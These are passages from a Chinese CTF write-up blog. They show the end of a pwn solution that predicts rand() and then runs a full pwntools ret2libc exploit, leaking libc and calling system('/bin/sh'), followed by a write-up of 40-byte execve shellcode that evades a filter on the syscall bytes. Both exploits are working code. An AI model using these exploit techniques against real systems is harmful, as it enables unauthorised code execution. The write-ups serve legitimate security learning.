<li><p><strong>取模操作：</strong><br> 接下来，程序在代码中执行了 <code>rand() % 100 + 1</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local_10 = rand() % 100 + 1;</span><br></pre></td></tr></table></figure>

<p>将 <code>0x4a2d2b9b</code> 转换为十进制：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4a2d2b9b = 1241046859</span><br></pre></td></tr></table></figure>

<p>对 100 取模：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1241046859 % 100 = 59</span><br></pre></td></tr></table></figure>

<p>然后再加 1：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local_10 = 59 + 1 = 60</span><br></pre></td></tr></table></figure></li>
</ol>
</blockquote>
<p>当然，上面这种算法计算比较困难（并且是错误的，只是作为原理演示），实际可以通过 gdb 调试确定，或者用 ctypes 直接调用同一个 libc（WP的方法），我们同样尝试一下这两种方法</p>
<h4 id="1-gdb-调试验证"><a href="#1-gdb-调试验证" class="headerlink" title="1. gdb 调试验证"></a>1. gdb 调试验证</h4><p>首先，根据ABI， <code>rand()</code> 的返回值一定放在 <code>EAX / RAX</code> 寄存器里，而 gdb 可以直接读寄存器。</p>
<p><img src="/images/25-12-16-week1-Random-Seed/cmp.png" alt="image-20251221114220959"></p>
<p>可以看到，我们在 cmp 之前断点就可以看到比较的值，这里不再细说</p>
<h4 id="2-ctypes-加载相同-libc"><a href="#2-ctypes-加载相同-libc" class="headerlink" title="2. ctypes 加载相同 libc"></a>2. ctypes 加载相同 libc</h4><p>rand() 算法和 libc 相关，只要使用相同的 libc 和种子，所得的伪随机数就相同。</p>
<p>[^注意]: rand 的本质是一个<em>状态机</em>，<code>srand(0)</code> 只是把状态初始化为 <code>state0</code> <em>每调用一次 rand，状态就前进一步</em>，所以每一步的 rand 返回值是不同的，在脚本中必须走相同的步数（rand调用次数和原程序相同）</p>
<p>之后就是典型的 ret2libc，exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;154.94.237.159&#x27;,34894)</span></span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf  = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">lib = ctypes.CDLL(<span class="string">&#x27;./libc.so.6&#x27;</span>) <span class="comment"># ctypes 加载同一个 libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lib.rand.restype = ctypes.c_int <span class="comment"># 设置返回类型（重要）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;tell me thy name.&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x12</span>) <span class="comment">#1. 覆盖 seed -&gt; 0</span></span><br><span class="line">lib.srand(<span class="number">0</span>) <span class="comment"># ctypes 同步 srand(0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):<span class="comment"># 2. 预测 99 次 rand</span></span><br><span class="line">    r = lib.rand()</span><br><span class="line">    guess = r % <span class="number">100</span> + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please guess the number:&#x27;</span>, p64(guess))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ROP 泄露 puts</span></span><br><span class="line">pop_rdi = <span class="number">0x401423</span></span><br><span class="line">myread  = <span class="number">0x40125D</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(myread)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Here&#x27;s a reward to thy brilliant mind.\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = p.recvline().strip()</span><br><span class="line">addr = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;puts leak: <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&#x27;libc base = <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. getshell</span></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>










      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/09/2025-12-09-week1-Shellcode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/12/09/2025-12-09-week1-Shellcode/" class="post-title-link" itemprop="url">CTF题解：shellcode</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-12-09 10:29:00" itemprop="dateCreated datePublished" datetime="2025-12-09T10:29:00+08:00">2025-12-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-12-10 13:49:25" itemprop="dateModified" datetime="2025-12-10T13:49:25+08:00">2025-12-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Shellcode（Decoder）"><a href="#Shellcode（Decoder）" class="headerlink" title="Shellcode（Decoder）"></a>Shellcode（Decoder）</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/shellcode/checksec.png" alt="image-20251209102926831"></p>
<p>checksec保护几乎全开，来看反编译：</p>
<p><img src="/images/shellcode/main1.png"></p>
<p><img src="/images/shellcode/main2.png" alt="image-20251209111737923"></p>
<p><strong>程序将 <code>DAT_114514000</code> 地址处的数据强制转换为函数指针并执行</strong>。现在问题在于，这里只有40字节布置shellcode，不知道这段区域是否可写可执行，以及filter函数过滤了什么。</p>
<p>下面再分析一下：</p>
<p><img src="/images/shellcode/vmmap.png"></p>
<p><img src="/images/shellcode/filter.png" alt="image-20251209114310555"></p>
<p>OK，看到 <strong>0x114514000到0x114515000处可写可执行</strong>，但是 **filter 会将连续的 \x0f\x05（<code>syscall</code> 指令的机器码） 转为 \0 **，现在的问题变成了如何绕过 syscall 的检查。</p>
<p>因为这里只有 <code>\x0f\x05</code> 的过滤，我们可以尝试构造<strong>减1的编码规则，即让 <code>\x0f\x05</code> 变为 <code>\x0e\x04</code></strong>，再通过构造解码器解码syscall，从而绕过syscall过滤。</p>
<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><p>我们在 filter 和 0x114514000 后面下断点，随便发送40个字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(p, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *filter</span></span><br><span class="line"><span class="string">b *0x114514000</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<p><img src="/images/shellcode/xgx.png" alt="image-20251209212032233"></p>
<p>可以看到全部落在了 0x114514000 区域，多运行几次发现，尽管有pie，这片区域地址不变。并且在执行0x114514000 区域前，0x114514000 会被加载到 rax 里，我们可以利用 rax 来计算要解码的 syscall 地址</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&quot;\x48\x31\xff&quot;</span>                                <span class="comment"># xor rdi, rdi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span>    <span class="comment"># mov rdi, 0x68732f6e69622f2f</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x89\xe7&quot;</span>                                <span class="comment"># mov rdi, rsp</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xf6&quot;</span>                                <span class="comment"># xor rsi, rsi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xd2&quot;</span>                                <span class="comment"># xor rdx, rdx </span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x21&quot;</span>                                <span class="comment"># inc byte [rax + 0x20]</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x22&quot;</span>                                <span class="comment"># inc byte [rax +0x21]                                  </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6a\x3b\x58&quot;</span>                                <span class="comment"># push 0x3b; pop rax</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0e\x04&quot;</span>                                    <span class="comment"># 编码后的 syscall</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;shellcode: <span class="subst">&#123;<span class="built_in">len</span>(shellcode)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *filter</span></span><br><span class="line"><span class="comment">#b *0x114514018</span></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your shellcode: \n&quot;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder"></span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
